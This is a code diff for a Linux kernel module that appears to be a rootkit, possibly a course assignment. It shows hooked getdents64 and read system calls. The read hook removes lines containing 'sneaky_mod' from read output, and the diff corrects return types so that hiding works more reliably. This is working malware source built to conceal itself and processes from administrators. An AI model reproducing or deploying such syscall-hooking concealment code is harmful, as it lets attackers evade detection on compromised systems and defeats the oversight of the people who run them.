@@ -79,7 +79,6 @@ asmlinkage int sneaky_getdents64(struct pt_regs *regs)
   int offset = 0;
   int remaining_size;
 
-  printk(KERN_INFO "get sneaky getdents64 with process id %s", pid);
   // error or nothing to read
   if (nread <= 0)
   {
@@ -95,6 +94,7 @@ asmlinkage int sneaky_getdents64(struct pt_regs *regs)
       remaining_size = nread - (offset + cur_dirent->d_reclen);
       memmove(cur_dirent, next_dirent, remaining_size);
       nread -= cur_dirent->d_reclen;
+      printk(KERN_INFO "get sneaky getdents64 with process id %s", pid);
     }
 
     offset += cur_dirent->d_reclen;
@@ -106,17 +106,17 @@ asmlinkage int sneaky_getdents64(struct pt_regs *regs)
 //  read
 //*****************
 
-asmlinkage int (*original_read)(struct pt_regs *regs);
-asmlinkage int sneaky_read(struct pt_regs *regs)
+asmlinkage ssize_t  (*original_read)(struct pt_regs *regs);
+asmlinkage ssize_t  sneaky_read(struct pt_regs *regs)
 {
-  int fd = regs->di;
+
   void *buf = regs->si;
-  size_t count = (size_t)regs->dx;
-  int nread = (*original_read)(regs);
+  ssize_t  nread = original_read(regs);
+  // printk(KERN_INFO "[Sneaky_sys_read]!\n");
 
   if (nread <= 0)
   {
-    return 0;
+    return nread;
   }
   void *st = strnstr(buf, "sneaky_mod", nread);
   if (st != NULL)
@@ -124,7 +124,7 @@ asmlinkage int sneaky_read(struct pt_regs *regs)
     void *ed = strnstr(st, "\n", nread - (st - buf));
     if (ed != NULL)
     {
-      int len = ed - st + 1;
+      ssize_t len = ed - st + 1;
       memmove(st, ed + 1, nread - (st - buf) - len);
       nread -= len;
     }
